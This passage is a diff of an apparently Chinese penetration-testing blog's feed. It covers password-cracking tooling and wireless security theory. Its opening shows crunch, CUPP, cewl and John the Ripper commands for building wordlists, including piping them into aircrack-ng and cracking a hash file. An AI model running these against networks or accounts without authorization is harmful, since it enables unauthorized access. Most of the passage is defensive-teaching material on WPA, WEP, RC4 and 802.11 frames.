-t @,%%^^ | more</code></pre><ul><li>@：小写字母 lalpha</li><li>,：大写字母 ualpha</li><li>%：数字 numeric</li><li>^：符号 symbols<h4 id="输出文件压缩"><a href="#输出文件压缩" class="headerlink" title="输出文件压缩"></a><strong>输出文件压缩</strong></h4>  <code>crunch 4 4 -t @,%^ -o 1.txt -z 7z</code><br>   其他压缩格式：gzip、bzip2、lzma<br>   7z压缩比率最大</li></ul><p><strong>Use example:</strong></p><pre><code>crunch 4 4 -f /usr/share/crunch/charset.lst mixalphanumeric-all-space -o w.txt -t @d@@ -s cdabcrunch 4 5 -p dog cat birdcrunch 5 5 abc DEF + \!@# -t ,@^%,    + 占位符    \ 转义符(空格、符号)crunch 5 5 -t ddd%% -p dog cat bird    任何不同于-p 参数指定的值都是占位符crunch 5 5 -d 2@ -t @@@%%组合破解工具应用 crunch 2 4 0123456789 | aircrack-ng a.cap -e MyESSID -w –crunch 10 10 12345 --stdout | airolib-ng testdb -import passwd</code></pre><h4 id="按个人信息生成其专属的密码字典"><a href="#按个人信息生成其专属的密码字典" class="headerlink" title="按个人信息生成其专属的密码字典"></a><strong>按个人信息生成其专属的密码字典</strong></h4><p><strong>CUPP：Common User Password Profiler</strong><br>    git clone <a href="https://github.com/Mebus/cupp.git" target="_blank" rel="noopener">https://github.com/Mebus/cupp.git</a><br>    python cup.py -i</p><p>通过收集网站信息生成字典<br>    cewl 1.1.1.1 -m 3 -d 3 -e -c -v -w a.txt<br>    -m：最小单词长度<br>    -e：收集包含email地址信息<br>    -c：每个单词出现次数<br>    支持基本、摘要 身份认证<br>    支持代理<br><strong>用户密码变型</strong></p><ul><li>基于 cewl 的结果进行密码变型 </li><li>末尾增加数字串</li><li>字母大小写变化</li><li>字母与符号互相转换 </li><li>字母与数字互相转换 </li><li>P@$$w0rd</li></ul><p><strong>使用 John the Ripper 配置文件实现密码动态变型</strong><br>    /etc/john/john.conf<br>    [List.Rules:Wordlist]<br>    $[0-9]$[0-9]$[0-9]<br>    john –wordlist=cewl.txt –rules –stdout &gt; m.txt</p><pre><code>[List.Rules:test]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[0-9]$[0-9]$[0-9]$[a-zA-Z]$[a-zA-Z]$[a-zA-Z]$[`~!@#$%^&amp;*()\-_=+]john --wordlist=cewl.txt --rules=test --stdout &gt; m.txtjohn --wordlist=ahm.lst --rules=test HASHFILE</code></pre>]]></content>
     
@@ -170,9 +183,7 @@
       <category term="密码破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
     
     
-      <category term="密码破解" scheme="http://c.cat.plus/tags/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    
-      <category term="字典" scheme="http://c.cat.plus/tags/%E5%AD%97%E5%85%B8/"/>
+      <category term="密码字典" scheme="http://c.cat.plus/tags/%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/"/>
     
       <category term="crunch" scheme="http://c.cat.plus/tags/crunch/"/>
     
@@ -372,9 +383,9 @@
       <category term="权限维持" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
     
     
-      <category term="漏洞提权" scheme="http://c.cat.plus/tags/%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
-    
       <category term="mimikatz" scheme="http://c.cat.plus/tags/mimikatz/"/>
+    
+      <category term="漏洞提权" scheme="http://c.cat.plus/tags/%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/"/>
     
   </entry>
   
@@ -405,6 +416,103 @@
       <category term="提权" scheme="http://c.cat.plus/tags/%E6%8F%90%E6%9D%83/"/>
     
       <category term="pinjector" scheme="http://c.cat.plus/tags/pinjector/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无线加密技术WPA安全系统</title>
+    <link href="http://c.cat.plus/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/"/>
+    <id>http://c.cat.plus/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WPA%E5%AE%89%E5%85%A8%E7%B3%BB%E7%BB%9F/</id>
+    <published>2013-05-28T15:24:10.000Z</published>
+    <updated>2020-05-23T03:04:42.379Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="WPA安全系统"><a href="#WPA安全系统" class="headerlink" title="WPA安全系统"></a><strong>WPA安全系统</strong></h4><p>Wi-Fi Protected Access<br>    802.11i 组为提高无线安全,开发两个新的链路层加密协议<br>        Temporal Key Integrity Protocol(TKIP)<br>            WPA1(较之WEP可动态改变密钥)<br>        Counter Mode with CBC-MAC(CCMP)<br>            WPA2<br>    WPA加密两种安全类型<br>        WPA个人:使用预设共享密钥实现身份验证<br>        WPA企业:使用802.1X和Radius服务器实现AAA(认证协议框架EAP)</p><h4 id="WPA1"><a href="#WPA1" class="headerlink" title="WPA1"></a><strong>WPA1</strong></h4><p>802.11i 第三版草案<br>    与WEP比较<br>        都采用逐包进行密钥加密<br>        128位的key和48位的初向量(IV)<br>        RC4流加密数据<br>        帧计数器避免重放攻击<br>        TKIP使用Michael算法进行完整性校验(MIC)<br>            WEP 使用CRC32进行MIC<br>        兼容早期版本硬件</p><h4 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a><strong>WPA2</strong></h4><p>依据802.11i 完全重新设计实现<br>        也被称为Robust Security Network(RSN)<br>        CCMP替代TKIP<br>        AES加密算法取代了RC4<br>        不兼容早期版本硬件</p><h4 id="WPA企业连接过程"><a href="#WPA企业连接过程" class="headerlink" title="WPA企业连接过程"></a><strong>WPA企业连接过程</strong></h4><ul><li>协商安全协议</li><li>身份认证</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="WPA-PSK"><a href="#WPA-PSK" class="headerlink" title="WPA-PSK"></a><strong>WPA-PSK</strong></h4><ul><li>协商安全协议</li><li>密钥分发和验证</li><li>数据加密完整性</li></ul><h4 id="协商安全协议"><a href="#协商安全协议" class="headerlink" title="协商安全协议"></a><strong>协商安全协议</strong></h4><p>协商认证方式<br>        PSK / 802.1X<br>    单播和组播/广播流量加密套件<br>        TKIP / CCMP<br>    STA通过probe获取无线网络信息<br>        速率<br>        加密<br>        通道<br>        名称</p><h4 id="身份认证-WPA企业"><a href="#身份认证-WPA企业" class="headerlink" title="身份认证(WPA企业)"></a><strong>身份认证(WPA企业)</strong></h4><p>身份认证基于Extensible Authentication Protocol(EAP)实现<br>        EAP-TLS,需要客户端和服务器证书<br>        EAP-TTLS<br>        PEAP混合身份验证,只需要服务器证书<br>    客户端选择身份认证方式<br>    AP发送身份验证信息给Radius Server,<br>    Radius Server返回”Radius Accept”报时认证成功<br>        其中包含Master Key(MK)<br>    AP通过EAP消息通知STA认证成功</p><h4 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a><strong>密钥交换</strong></h4><p>无线网络设计用于一组无线设备通信<br>        关联到同一AP的设备共享无线信道<br>        单播,广播,组播<br>            安全特性要求不同<br>            单播通信需要单独密钥加密通信双方流量<br>            pairwise key:对偶临时密钥(PIK)<br>            组播通信需要信任域内所有成员共享的同一密钥<br>            group key:组临时密钥(GTK)</p><p><strong>PMK</strong><br>安全上下文的顶级密钥<br>        MK进行TLS-PRF加密得出PMK<br>    基于服务密钥<br>        由上层身份验证方法服务器生成<br>        从服务器通过 radius传给AP<br>        从AP通过EAP消息传给所有STA<br>    基于PSK共享密钥<br>        Essid+PSK+迭代次数4096—-Hash计算生成<br>        STA和AP分别计算得出PMK,并不在网络中传递交换<br>    256位即32字节</p><h4 id="PTK的生成过程"><a href="#PTK的生成过程" class="headerlink" title="PTK的生成过程"></a><strong>PTK的生成过程</strong></h4><ul><li>HMAC-SHA1散列算法</li><li>PRF-X散列算法</li></ul><h5 id="四步握手过程生成PTK"><a href="#四步握手过程生成PTK" class="headerlink" title="四步握手过程生成PTK"></a><strong>四步握手过程生成PTK</strong></h5><ul><li>AP发送Anonce给STA</li><li>STA生成Snonce计算出PTK</li><li>Snonce加PTK的MIC发给AP</li><li>AP拿到Snonce计算出PTK</li><li>AP计算MIC与接收的MIC比对</li><li>MIC一致说明确定STA知道PMK<br>  AP发GTK给STA<br>  STA回复ACK并使用密钥加密</li></ul><p>数据加密和完整性<br>    三种算法<br>        Temporal Key Integrity Protocol(TKIP)4<br>        Counter Mode with CBC-MAC(CCMP)5<br>        Wireless Robust Authenticated Protocol(WRAP)6</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;WPA安全系统&quot;&gt;&lt;a href=&quot;#WPA安全系统&quot; class=&quot;headerlink&quot; title=&quot;WPA安全系统&quot;&gt;&lt;/a&gt;&lt;strong&gt;WPA安全系统&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;Wi-Fi Protected Access&lt;br&gt;    802
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="无线加密" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E5%8A%A0%E5%AF%86/"/>
+    
+      <category term="WPA" scheme="http://c.cat.plus/tags/WPA/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>WEP加密及RC4算法</title>
+    <link href="http://c.cat.plus/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/"/>
+    <id>http://c.cat.plus/2013/05/28/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/WEP%E5%8A%A0%E5%AF%86-RC4%E7%AE%97%E6%B3%95/</id>
+    <published>2013-05-28T11:12:14.000Z</published>
+    <updated>2020-05-23T02:53:23.919Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a><strong>加密</strong></h4><p>无线安全根源<br>    802.11基于无线电波发射信息<br>    嗅探侦听是主要问题<br>    加密机制是必须手段<br>Wired Equivalent Privacy(WEP)<br>    802.11标准的一部分<br>    发布后不久被发现存在安全漏洞<br>Wi-Fi Protected Access(WPA)取代WEP<br>    WPA2(802.11i 标准)</p></blockquote><h4 id="OPEN无加密网络"><a href="#OPEN无加密网络" class="headerlink" title="OPEN无加密网络"></a><strong>OPEN无加密网络</strong></h4><p>无任何加密机制<br>    所有数据都可以被嗅探<br>    STA和AP只协商拼配参数即可连入网络        </p><h4 id="WEP加密"><a href="#WEP加密" class="headerlink" title="WEP加密"></a><strong>WEP加密</strong></h4><p>使用Rivest Cipher 4(RC4)算法加密流量内容,实现机密性<br>    CRC32算法检查数据完整性<br>    标准采用使用24位initialization vector(IV)<br>    受美国加密技术出口限制法律的要求<br>        高于64bit key禁止出口<br>        所以除24bit IV之外真实的key只有40bit的版本被允许出口<br>        出口限制法律撤销后实现了128bit key的WEP版本(使用相同的24bit IV)</p><h4 id="RC4算法"><a href="#RC4算法" class="headerlink" title="RC4算法"></a><strong>RC4算法</strong></h4><p>RSA实验室研发的对称加密流算法<br>        实现简单<br>        速度快<br>    加密:对明文流和密钥流进行XOR计算(XOR:二进制异或运算)<br>    解密:对密文流和密钥流进行XOR计算<br>    RC4算法key由两个过程生成<br>        合并IV和PSK,利用Key Scheduling Algorithm(KSA)算法生成起始状态表<br>        Pseudo-Random Generation Algorithm(PRGA)算法生成最终密钥流<br>RC4算法加密流程<br>RC4算法解密流程</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;blockquote&gt;
+&lt;h4 id=&quot;加密&quot;&gt;&lt;a href=&quot;#加密&quot; class=&quot;headerlink&quot; title=&quot;加密&quot;&gt;&lt;/a&gt;&lt;strong&gt;加密&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;无线安全根源&lt;br&gt;    802.11基于无线电波发射信息&lt;br&gt;    嗅探
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="无线加密" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E5%8A%A0%E5%AF%86/"/>
+    
+      <category term="RC4" scheme="http://c.cat.plus/tags/RC4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>无线通信技术Radiotap Head原理</title>
+    <link href="http://c.cat.plus/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/"/>
+    <id>http://c.cat.plus/2013/05/27/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/RADIOTAP%E5%A4%B4%E9%83%A8/</id>
+    <published>2013-05-27T15:22:11.000Z</published>
+    <updated>2020-05-23T02:44:29.367Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="Radiotap-Head"><a href="#Radiotap-Head" class="headerlink" title="Radiotap Head"></a><strong>Radiotap Head</strong></h4><p>802.11侦发射和接收的事实标准,802.11依赖Radiotap完成通信过程<br>Linux系统在驱动和API中内建支持Radiotap<br>802.11帧发射之前,网卡驱动在802.11头前面添加Radiotap头,反之当网卡接收到无线帧时,驱动通知MAC层,此帧头包含Radiotap头<br>Radiotap为802.11帧传递额外信息,厂家可自定义,因此头长度不固定<br>不破坏原始头结构,增加传递的信息</p><h4 id="分为Header和data"><a href="#分为Header和data" class="headerlink" title="分为Header和data"></a><strong>分为Header和data</strong></h4><p>Version(8bit)<br>    值始终为0<br>Pad(8bit)<br>    未使用,只作为字段强制对其占位；<br>Length(16bit)<br>    整个radiotap头长度(可变),作用是确定802.11头的开始位置<br>Present(32bit)<br>    Data段的掩码<br>    Ext(1,0)<br>    MAC不能理解的头部直接忽略</p><h4 id="802-11头部信息"><a href="#802-11头部信息" class="headerlink" title="802.11头部信息"></a><strong>802.11头部信息</strong></h4><p>DU(Data Unit)即数据单元,信息传输的最小数据集合<br>    传递过程逐层封装(Encapsulation)<br>    SDU(Service Data Unit) /PDU(Protocol Data Unit)<br>    MSDU–&gt;MIC–&gt;分帧–&gt;添加IV–&gt;加密–&gt;添加MAC头部–&gt;MPDU<br>    MPDU/PSDU+物理头=PPDU–&gt;RF发射</p><h4 id="802-11-MAC头结构"><a href="#802-11-MAC头结构" class="headerlink" title="802.11 MAC头结构"></a><strong>802.11 MAC头结构</strong></h4><p>Frame Control<br>    Protocol Version(2bit)    :802.11协议版本,始终为0,1,2,3<br>    Type(2bit)    :规定帧的具体用途(3种帧类型)<br>        控制帧(1)<br>        数据帧(2)<br>        管理帧(0)<br>    SubType(4bit)<br>        每个类型对应多个子类型,协议规定不同类型/子类型的帧完成不同功能的操作<br>    To DS/From (1/1bit)<br>        标识帧的传输方向,传向DS或者来自DS；这两个字段的值决定着MAC头中4个Adddress字段的不同定义.<br>    0x00:出现在IBSS环境中(可能是Management帧或者是Control帧类型)；或者是STSL(Stantion to Station Link)中两个STA间通信,这种情况下通信不通过AP；<br>    0x01:表示Data帧从AP向STA传递;<br>    0x02:表示Data帧从Sta向AP传递;<br>    0x03:表示两个AP间通信,这是典型的WDS(Wireless Distribution System)环境下AP间的通信,或者表示Mesh环境下MP间的通信；只有此时才会使用到Address4字段；    </p><p>More frag(1bit):表示是否还有后续帧<br>        值为1时表示有后续分段,可能是Data或Management帧类型.只有单播接收地址的帧会被分段；<br>    Retry(1bit):重传<br>        值为1表示重传帧,可能是Data或Management帧类型,接收端进程使用此值防止帧重复；<br>    Power Mgmt(1bit):活动模式(0)/省电模式(1)<br>        STA处于省电模式时,向关联的AP发送该值为1的帧(AP从不使用此字段),省电模式下STA不接收数据,发送给它的Data帧由AP暂时缓存；<br>    More Data(1bit)<br>        当AP缓存了至少一个MSDU时,会向省电模式的STA发送该值为1的帧,表示有数据要传输给STA,接收到此帧的STA唤醒自己并向AP发送PS-Poll帧,<br>        取回由AP为其缓存的数据.也被用于AP有更多的广播/多播帧需要发送的情况；<br>    Protected Frame(1bit)<br>        可能是Data或Management帧类型,表示MSDU是否被加密；也被用于表示PSK身份验证Frame#3帧;数据载荷为空时,该字段值为0；<br>    Order(1bit)<br>        在非QoS帧的情况下,值为1表示数据必须按严格顺序处理,通常为0；</p><h4 id="Duration-ID-16bit"><a href="#Duration-ID-16bit" class="headerlink" title="Duration/ID(16bit)"></a><strong>Duration/ID(16bit)</strong></h4><p>所有Control帧都使用该字段,其作用随Type/SubType变化有所不同；<br>    帧类型为PS Poll(type:1,subtype:10)时,表示STA关联的AIP(association identity);<br>    其他情况下该字段作为一种载波侦听机制,表示接收下一帧之前需要保持的时间间隔,用于NAV(Network Allocation Vector)计算,单位是微秒；</p><h4 id="MAC-Layer-Address"><a href="#MAC-Layer-Address" class="headerlink" title="MAC Layer Address"></a><strong>MAC Layer Address</strong></h4><p>前面已经提到了4种,这里补充最后一种:Basic service set ID(BSSID); 它是BSS的2层唯一标识,Infrastructure模式中BSSID就是AP的MAC地址,当AP支持多BSS时,随机生成每个BSSID；</p><h4 id="Sequence-Control-16bit"><a href="#Sequence-Control-16bit" class="headerlink" title="Sequence Control(16bit)"></a><strong>Sequence Control(16bit)</strong></h4><p>这个字段包含两个子字段:Sequence Number和Fragment Number;<br>    Sequence Number是每个帧的编号,数值范围是0–4095,以1为步长递增.当帧被分段时,同一帧中不同分段的Sequence Number相同；<br>    Fragment Number是被分段的帧用于标识分段位置顺序的编号,数值范围是0–15,以1为步长递增；</p><h4 id="DATA部分"><a href="#DATA部分" class="headerlink" title="DATA部分"></a><strong>DATA部分</strong></h4><p>Frame Body(变长)<br>    数据字段,未加密的最大MSDU长度为2304字节(其中包含最大256字节的上层头信息,和可被传递的数据2048字节).<br>    不同的加密方法会增加一定的内容长度；<br>    WEP:8 bytes–&gt;2312bytes<br>    TKIP(WPA1):20bytes–&gt;2324bytes<br>    CCMP(WPA2):16bytes–&gt;2320bytes<br>    注:Control类型的帧没有Frame Body内容.</p><h4 id="FCS-32bit"><a href="#FCS-32bit" class="headerlink" title="FCS(32bit)"></a><strong>FCS(32bit)</strong></h4><p>发送端对全部MAC包头和Frame Body内容进行CRC计算,计算结果即为FCS(Frame Check Sequence)值,接收端进行同样的计算,结果一致时,<br>    则接收端向发送端返回ACK,否则丢弃帧(只对单播帧有效,FCS错误的广播/多播帧可能被接收)<br>    注:wireshark抓包时已经删除了FCS值</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h4 id=&quot;Radiotap-Head&quot;&gt;&lt;a href=&quot;#Radiotap-Head&quot; class=&quot;headerlink&quot; title=&quot;Radiotap Head&quot;&gt;&lt;/a&gt;&lt;strong&gt;Radiotap Head&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;802.11侦发射
+      
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
+    
+    
+      <category term="802.11" scheme="http://c.cat.plus/tags/802-11/"/>
+    
+      <category term="无线数据帧" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%95%B0%E6%8D%AE%E5%B8%A7/"/>
     
   </entry>
   
@@ -574,75 +682,6 @@
       <category term="无线通信" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E9%80%9A%E4%BF%A1/"/>
     
       <category term="Probe" scheme="http://c.cat.plus/tags/Probe/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>无线技术概念</title>
-    <link href="http://c.cat.plus/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/"/>
-    <id>http://c.cat.plus/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E6%A6%82%E5%BF%B5/</id>
-    <published>2013-05-23T13:11:04.000Z</published>
-    <updated>2020-05-18T07:13:50.643Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><h3 id="无线技术概念"><a href="#无线技术概念" class="headerlink" title="无线技术概念"></a><strong>无线技术概念</strong></h3></blockquote><h4 id="分贝dB"><a href="#分贝dB" class="headerlink" title="分贝dB"></a><strong>分贝dB</strong></h4><p>测量无线信号强度<br>B:向Alexander Graham Bell 致敬<br>    今天大部分声学设备的发明者和理论奠基人<br>dB:表示2个信号之间的差异比率,用于描述设备的信号强度<br>    是一个相对值<br>dBm:功率值与1mW进行比较的dB值结果<br>dBpower=10.log(singnal/reference)<br>10.log(100mW/1mW)=10*2=20dBm<br>每增加3dBm,功率增加约1倍<br>每增加10dBm,功率增加约10倍<br>Example:<br>    dBm        mW<br>    0        1<br>    10        10<br>    15        32<br>    17        50<br>    20        100<br>    23        200<br>    27        512<br>    30        1000</p><h4 id="dBi-全向天线辐射强度"><a href="#dBi-全向天线辐射强度" class="headerlink" title="dBi:全向天线辐射强度"></a><strong>dBi:全向天线辐射强度</strong></h4><p>全向天线的信号功率增益<br>增益是指信号功率强度增加了多少dB<br>300mW=24.8dBi的无线路由器,添加一个9dBi的天线后功率如何变化(假设2dBi的电缆和接头耗损)<br>24.8dBi+9dBi-2dBi=31.8dBi<br>换算回mW功率<br>10(31.8dBi/10)次方=10*3.18次方=1513mW<br>dBm功率相加等于mW功率相乘</p><h4 id="dBd-定向天线辐射强度"><a href="#dBd-定向天线辐射强度" class="headerlink" title="dBd:定向天线辐射强度"></a><strong><code>dBd</code>:定向天线辐射强度</strong></h4><p>dBd是定向天线的增益值<br>全向天线在所有方向上收发信号,定向天线在指定方向的范围内收发信号<br>天线增益越大信号传输距离越远</p><p>既然有mW来表示功率为什么还要引入dB这个单位?<br>接收信号时无线信号转变为高频电子脉冲,反之发射信号时高频电子脉冲转换为无线电波,<br>这些过程功率往往要产生上万倍的变化,使用W,mW来计数非常不便,而dBm单位通过对功率的对数计算,<br>使用一个较小的数值既可以比较直观的表达功率的变化,因此无线和声学系统都采用了dB这个单位.</p><p>全向天线波形图<br>甜甜圈<br>天线选择的误区<br>益越高越好<br>高功耗<br>对周围环境的信号干扰<br>增益过高的全向天线会变成定向天线</p><h4 id="5dBi-vs-9dBi全向天线波形图对比"><a href="#5dBi-vs-9dBi全向天线波形图对比" class="headerlink" title="5dBi vs 9dBi全向天线波形图对比"></a><strong>5dBi vs 9dBi全向天线波形图对比</strong></h4><p>定向天线<br>双四边形<br>定向发送信号<br>功率相同时,比全向天线传输距离更远(方向正确的情况下)<br>定向天线<br>八木天线,引向反射天线；<br>定向天线<br>平面天线<br>定向天线<br>扇形天线<br>常用于移动电话网络<br>3到4个扇形天线联合使用可实现全向信号覆盖<br>90度扇形天线<br>定向天线<br>120度扇形天线波形<br>定向天线<br>网状天线<br>射束带宽更加集中,功率更强</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;blockquote&gt;
-&lt;h3 id=&quot;无线技术概念&quot;&gt;&lt;a href=&quot;#无线技术概念&quot; class=&quot;headerlink&quot; title=&quot;无线技术概念&quot;&gt;&lt;/a&gt;&lt;strong&gt;无线技术概念&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
-&lt;h4 id=&quot;分贝dB&quot;
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
-    
-      <category term="无线渗透" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
-    
-      <category term="无线技术理论" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/"/>
-    
-    
-      <category term="全向天线" scheme="http://c.cat.plus/tags/%E5%85%A8%E5%90%91%E5%A4%A9%E7%BA%BF/"/>
-    
-      <category term="无线技术" scheme="http://c.cat.plus/tags/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF/"/>
-    
-      <category term="定向天线" scheme="http://c.cat.plus/tags/%E5%AE%9A%E5%90%91%E5%A4%A9%E7%BA%BF/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>802_11无线协议结构</title>
-    <link href="http://c.cat.plus/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
-    <id>http://c.cat.plus/2013/05/23/Wireless_Attacks/%E6%97%A0%E7%BA%BF%E6%8A%80%E6%9C%AF%E7%90%86%E8%AE%BA/802_11%E6%97%A0%E7%BA%BF%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</id>
-    <published>2013-05-22T21:33:02.000Z</published>
-    <updated>2020-05-18T07:13:27.707Z</updated>
-    
-    <content type="html"><![CDATA[<p>无线技术变化快,难度大<br>行业迅猛发展<br>互联网的重要入口<br>边界模糊<br>安全实施缺失而且困难<br>对技术不了解而造成配置不当<br>企业网络私自接入AP破坏网络边界<br>aircrack-ng suite作者写过一本关于无线渗透的书</p><h4 id="协议结构"><a href="#协议结构" class="headerlink" title="协议结构"></a><strong>协议结构</strong></h4><p>802.11标准<br>IEEE(Institute of Electrical and Electronice Engineers)<br>    由通信航天生物电气电子等方面的科学家组成,目的是制定标准,指导行业技术的发展,目前成员近40万人<br>IEEE分为不同的技术委员会(Committees),其中802委员会负责lan,man标准的制定<br>    以太网<br>    令牌环网<br>    无线局域网<br>    网桥<br>    无线(802.11)<br>        应用层<br>        表示层<br>        会话层<br>        传输层<br>        网络层<br>        数据链路层<br>            逻辑链路控制子层LLC<br>            媒体访问控制子层MAC<br>        物理层</p><h4 id="IEEE-802-1-1-标准"><a href="#IEEE-802-1-1-标准" class="headerlink" title="IEEE 802.1 1 标准"></a><strong>IEEE 802.1 1 标准</strong></h4><p>802委员会下第11组负责开发无线局域网标准<br>IEEE 802.1 1 The Original WLAN Standard - 1 Mbit/s and 2 Mbit/w,2.4 GHz RF and IR<br>IEEE 802.1 1a Up to 54 Mbit/s,5GHz<br>IEEE 802.1 1b 802.11 Enhancerments to Support 5.5 Mbit/s and 11 Mbit/s<br>IEEE 802.1 1c Bridge Operation Procedures<br>IEEE 802.1 1d International (Country to Country) Roaming Extensions<br>IEEE 802.1 1e Quality of Service (QoS),Including Packet Bursting<br>IEEE 802.1 1F Inter-Access Point Protocol<br>IEEE 802.1 1g 54 Mbit/s,2.4 GHz<br>IEEE 802.1 1h Spectrum Managed 802.11a(5 GHz) for European Compatibility<br>IEEE 802.1 1i Enhanced Security<br>IEEE 802.1 1j Extensions for Japan<br>IEEE 802.1 1k Radio Resource Measurement Enhancements<br>IEEE 802.1 1n Higher Throughput Using Multiple Input,Multiple Output (MIMO) Antennas<br>IEEE 802.1 1p Wireless Access for the Vehicular Environment (WAVE)<br>IEEE 802.1 1r Fast BSS Transition (FT)<br>IEEE 802.1 1s Mesh Networking,Extended Service Set (ESS)<br>IEEE 802.1 1T Wireless Performance Prediction(WPP)<br>IEEE 802.1 1u Internetworking with Non -802 Networks (i.e.:Cellular)<br>IEEE 802.1 1v Wireless Network Management<br>IEEE 802.1 1w Protected Management 